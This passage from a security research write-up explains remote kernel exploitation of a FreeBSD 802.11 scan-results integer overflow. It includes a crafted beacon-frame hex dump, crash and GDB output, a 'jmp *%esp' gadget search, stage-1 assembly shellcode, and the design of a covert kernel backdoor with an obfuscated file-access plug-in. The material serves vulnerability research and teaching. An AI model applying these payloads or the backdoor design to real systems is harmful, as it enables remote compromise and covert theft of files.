} 
At the point where the two optional field’s lengths are added together, there is a flaw. The struct 
member isr_ie_len is defined as a uint8_t, and if these two fields has a combined length of more then 
253 (2+2 are added for the head of the field) the result will result in an integer overflow. This in turn 
causes isr_len to be less then the actual size of all these fields together. Later on in the function 
get_scan_results() the individual sizes of these fields are being used while doing the memcpy(), this 
could potentially overflow the stack-area which holds the union u. 
Test our theories 
Now we need to test our theories, to do this effectively we insert hard-coded values for this function 
into the kernel. Then enable kernel debugging in the kernel config: 
makeoptions     DEBUG=-g  
options         GDB 
options         DDB # optional 
options         KDB 
Then recompile and reboot the system with the new kernel. We make sure DDB is our current 
debugger: 
$ sysctl –w debug.kdb.current=ddb
To trigger this particular code-path we call ifconfig with the “scan” command. Wow! We panic the 
kernel: 
Fatal trap 12: page fault while in kernel mode 
fault virtual address   = 0x41414155 
fault code              = supervisor write, page not present 
instruction pointer     = 0x20:0xc06c405c 
stack pointer           = 0x28:0xd0c5e938 
frame pointer           = 0x28:0xd0c5eb4c 
code segment            = base 0x0, limit 0xfffff, type 0x1b 
                        = DPL 0, pres 1, def32 1, gran 1 
processor eflags        = interrupt enabled, resume, IOPL = 0 
current process         = 203 (ifconfig) 
[thread pid 203 tid 100058 ] 
Stopped at      ieee80211_ioctl_getscanresults+0x120:   subw   %dx,0x14(%eax) 
Now we need to figure out what could be done with this vulnerability, could this be triggered remotely? 
When investigating this we find out that the 802.1X authenticator wpa_supplicant distributed with 
FreeBSD calls this particular IOCTL regularly. This userland-daemon is needed for authentication to 
access pointers providing better encryption/authentication then plain WEP like WPA-PSK. 
Test on real system 
To be able to test this for real we need to be able to send raw frames. The solution was to patch BPF in 
NetBSD (which share most of the wireless code with FreeBSD) so it was possible to send arbitrary raw 
ieee802.11 link-layer frames. BPF is *BSDs raw interface to the network devices. 
Before sending any bogus beacon frames we want to switch to a better debugging environment though, 
GDB. A serial-cable is connected to the target machine and the target is being configured to use GDB 
as current debugger. 
In /boot/device.hints, change the flags of the serial device: 
hint.sio.0.flags="0x80” 
Then switch default debugger: 
$ sysctl –w debug.kdb.current=gdb 
For more information see: 
http://www.freebsd.org/doc/en_US.ISO8859-1/books/developers-handbook/kerneldebug.html 
Sending beacon of death 
A beacon-frame with large SSID, WPA and WME fields is prepared and sent from the attacking 
machine.
Frame seen in tcpdump output: 
16:32:33.155795 0us BSSID:cc:cc:cc:cc:cc:cc DA:ff:ff:ff:ff:ff:ff SA:cc:cc:cc:cc:cc:cc Beacon 
(XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX) [1.0* 2.0* 5.5 11.0 Mbit] ESS CH: 1 
0x0000:  ceef f382 c40b 0000 6400 0100 0020 5858  ........d.....XX 
0x0010:  5858 5858 5858 5858 5858 5858 5858 5858  XXXXXXXXXXXXXXXX 
0x0020:  5858 5858 5858 5858 5858 5858 5858 0104  XXXXXXXXXXXXXX.. 
0x0030:  8284 0b16 0301 01dd fc00 50f2 0141 4141  ..........P..AAA 
0x0040:  4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA 
... 
0x0120:  4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA 
0x0130:  4141 4141 41dd fd00 50f2 0201 4141 4141  AAAAA...P...AAAA 
0x0140:  4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA 
... 
0x0220:  4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA 
0x0230:  4141 4141                                AAAA 
Wow, this resulted in a panic on the target! 
GDB-session from the debugger machine: 
[New Thread 100058] 
Program received signal SIGSEGV, Segmentation fault. 
[Switching to Thread 100058] 
0xc06c405c in ieee80211_ioctl_getscanresults (ic=0x41414141, ireq=0x41414141) 
    at ../../../net80211/ieee80211_ioctl.c:1047 
1047            ireq->i_len -= space; 
(gdb) print ireq 
$1 = (struct ieee80211req *) 0x41414141 
(gdb) bt 
#0  0xc06c405c in ieee80211_ioctl_getscanresults (ic=0x41414141, ireq=0x41414141) 
    at ../../../net80211/ieee80211_ioctl.c:1047 
#1  0x41414141 in ?? () 
#2  0x41414141 in ?? () 
#3  0x41414141 in ?? () 
#4  0x41414141 in ?? () 
#5  0x41414141 in ?? () 
#6  0x41414141 in ?? () 
As we see here, the frame seems to be corrupted. 
gdb) list ieee80211_ioctl_getscanresults  
1003    static int 
1004    ieee80211_ioctl_getscanresults(struct ieee80211com *ic, struct ieee80211req 
*ireq) 
1005    { 
1006            union { 
1007                    struct ieee80211req_scan_result res; 
1008                    char data[512];         /* XXX shrink? */ 
1009            } u; 
1010            struct ieee80211req_scan_result *sr = &u.res; 
1011            struct ieee80211_node_table *nt; 
We want to examine how much of the union (and possibly after) we have overwritten: 
gdb) x/150xw &u 
0xd0c5e960:     0x00fd2000      0x00000000      0x58585858      0x58585858 
0xd0c5e970:     0x58585858      0x58585858      0x58585858      0x58585858 
0xd0c5e980:     0x58585858      0x58585858      0x5000fcdd      0x414101f2 
0xd0c5e990:     0x41414141      0x41414141      0x41414141      0x41414141 
... 
0xd0c5eb40:     0x41414141      0x41414141      0x41414141      0x41414141 
0xd0c5eb50:     0x41414141      0x41414141      0x41414141      0x41414141 
0xd0c5eb60:     0x41414141      0x41414141      0x41414141      0x41414141 
0xd0c5eb70:     0x41414141      0x41414141      0x41414141      0x41414141 
0xd0c5eb80:     0x41414141      0xd0c5eb41      0xc063b816      0xc1509d00 
0xd0c5eb90:     0xc01c69eb      0xc16eec00 
... 
(gdb) print $ebp 
$8 = (void *) 0xd0c5eb4c 
We clearly see that we have overwritten over and past the frame-pointer and the saved return-address. 
What to use as return-address 
We need to find a suitable address for our return address. Kernel stack-addresses are totally unreliable 
in this case, they can't be used.  A better option is to return into the kernel's .text segment, to an address 
which contains the instruction “jmp ESP” or equivalent.  
A search in the GENERIC/i386 kernel image for interesting byte sequences using a small program 
written by the author: 
$ search_instr.py  -s 0x003d4518 -f 0x00043c30 -v 0xc0443c30 
FreeBSD_GENERIC_i386_6.0 
0xc0444797: 0xff 0xd7, call *%edi 
0xc04486c4: 0xff 0xd7, call *%edi 
... 
0xc044c5dd: 0xff 0xd7, call *%edi 
0xc044dd3d: 0xff 0xe4, jmp *%esp 
0xc0450109: 0xff 0xd1, call *%ecx 
... 
When the kernel returns from the exploited function, it will continue execution on the stack right after 
the overwritten return-address. 
Stage1 payload 
The initial payload needs to reside after the overwritten return-address, the area before can't be used 
reliably because other access-points could potentially overwrite this when the kernel iterates through 
the list. The payload needs to be limited to 32 bytes, after that there is a frame which is needed when 
returning from the exploited function. 
The task of the stage1 payload is to locate the second stage. The second stage is located in the kernel-
list of access-points, in that access-points WME field (which was sent in the beacon frame). When this 
is found, it jumps to it. 
beacon_payload_stage1: 
                // We know there will be one ic ptr at ioctl_saved_frame-4(%esp) 
                movl    IOCTL_SAVED_FRAME_OFF-4(%esp),%eax 
                movl    IC_IC_SCNT_OFF(%eax),%ebx // move ic->ic_scan.nt_node                
itr_nodes:                                        // to %ebx (ni) 
                movl    NI_WPA_OFF(%ebx),%ecx     // mov ni->wpa to %ecx 
                cmpb    $MAC_C,NI_MAC_OFF(%ebx)   // Check if we found our MAC 
                movl    %ebx,%edx 
                movl    0x8(%ebx),%ebx            // advance to the ni ptr 
                jne     itr_nodes 
                addl    $0x6,%ecx                 // We need to skip the WPA- 
                                                  // header plus the padding 
                jmp     *%ecx                     // Call our dirty code! 
Stage2 payload 
The second stage allocates kernel memory for the backdoor and then copies backdoor code from the 
WPA field for the “exploiting” access-point to the allocated area, saves away the original function 
pointer for the management frame handler and then replaces it with a pointer to the backdoor. When the 
second stage is finished it restores the frame of the function two levels down (the previous frame was 
corrupted by the overwrite) and sets the return result for ioctl to return an empty scan-list without 
errors.  
Backdoor 
The communication from the attacker to the backdoor is done by sending management-frames. The 
backdoor is called every time the victim is receiving a management-frame, the backdoor then looks for 
a magic number at a fixed offset and if this magic number matches it continues to process the frame as 
a command. If the magic number does not match it passes the frame to the original management-frame 
handler, in this way the ordinary function of the interface won't be interfered. The magic-number and 
payload is within a WPA IE field, so it's still a valid IEEE 802.11 frame. 
The backdoor assumes a “bootstrap-command” as the first command since not all of the backdoor-code 
fits into stage 2, this simplifies the implementation of the exploit. 
Backdoor commands 
The backdoor handles the communication with the attacker, all the responses sent back to the attacker 
are sent with a probe-response frame and the payload-data is within the optional response-field of that 
frame. All frames are sent to/from faked MAC-addresses. 
Ping backdoor 
The ping command takes a 32-bit identifier as an argument and responds back with a pong-response 
which includes the identifier. This is used to verify the installation of the backdoor. 
Upload backdoor-code 
The upload command receives a portion of backdoor-code to insert in the backdoor along with and 
offset, this code can later be executed.  
Execute backdoor-code 
The execute command calls backdoor-code at a specific offset and with a variable size data-argument. 
The executed code can return resulting data, if any data is returned it's sent back as a response to the 
attacker by the backdoor.
Plug-ins 
With the two primitives upload and execute, we can implement a dynamic plug-in facility. With this we 
can write relatively isolated backdoor functions that can be changed on-the-fly. 
Fileserver plug-in 
A small fileserver plug-in has been implemented, this has the ability to read files, stat files, write and 
create files. It does this directly at the VFS layer; no process will have those files associated. A variant 
of this fileserver which XOR-obfuscates the data has also been implemented. This way your filesystem 
won't show up in the tcpdump output. :) 
Filesystem operations in kernel exploits 
When doing FS operations in kernel exploits, do it as the kernel does it. Extract the essential calls 
needed for the operations; there is a lot of extra stuff the kernel does that you don't want, like handling 
filedescriptors. 
The outlines for open and read example: 
• Initialize a struct nameidata, the way NDINIT() macro does, this involves setting the 
filename. 
• Make sure the current threads process has a working directory:                     td->td_proc-
>p_fd->fd_cdir = rootvnode; 
• Try lookup vnode with vn_open() 
• Do the actual read with vn_rdwr() 
• Unlock and close vnode using vn_close() and VOP_UNLOCK_APV() 
Some vnode operations are messy in assembly, disassembling the kernel could help getting a better 
understanding of the code in question. 
Final words 
The IEEE802.11 framework in *BSD is a huge work and deserve credits, it creates one interface for all 
wireless devices. This is a very nice thing, especially if you look at the situation of other operating-
systems.  
…though it might need some cleaning up and security auditing. 
References 
Matthew S. Gast; 802.11 Wireless Networks: The Definitive Guide (O’Reilly Networking) 
ISBN: 0596001835 
Marshall K. McKusick, Keith Bostic, Michael J. Karels, John S. Quarterman; The Design and 
Implementation of the 4.4BSD Operating System 
ISBN: 0-201-54979-4
More resources about kernel exploitation 
Attacking the Core: Kernel Exploiting Notes 
http://www.phrack.org/issues.html?issue=64&id=6 
Remote Windows Kernel Exploitation - Step into the Ring 0 (Whitepaper) 
http://research.eeye.com/html/Papers/download/StepIntoTheRing.pdf 
Remote Windows Kernel Exploitation - Step into the Ring 0 
http://www.blackhat.com/presentations/bh-usa-05/bh-us-05-jack-update.pdf 
Windows Local Kernel Exploitation 
http://www.packetstormsecurity.org/hitb04/hitb04-sk-chong.pdf 
Exploiting 802.11 Wireless Driver Vulnerabilities on Windows 
http://www.uninformed.org/?v=6&a=2&t=sumry 
Exploiting Windows Device Drivers 
http://www.piotrbania.com/all/articles/ewdd.pdf 
Smashing The Kernel Stack For Fun And Profit 
http://www.phrack.org/archives/60/p60-0x06.txt 
Exploiting Kernel Buffer Overflows FreeBSD Style 
http://www.groar.org/expl/advanced/fbsdjail.txt 
Kernel Level Vulnerabilities 
http://www.comms.scitech.susx.ac.uk/fft/security/kernvuln-1.0.2.pdf 
Unix Kernel Auditing 
http://pacsec.jp/psj05/psj05-vansprundel-en.pdf 
The /proc/pid/mem problem 
http://ilja.netric.org/files/kernelhacking/procpidmem.pdf 
Win32 Device Drivers Communication Vulnerabilities 
http://artofhacking.com/tucops/hack/WINDOWS/live/aoh_win32dcv.htm 
Windows Kernel-mode Payload Fundamentals 
http://www.uninformed.org/?v=3&a=4&t=sumry 
How To Exploit Windows Kernel Memory Pool 
http://xcon.xfocus.org/xcon2005/archives/2005/Xcon2005_SoBeIt.pdf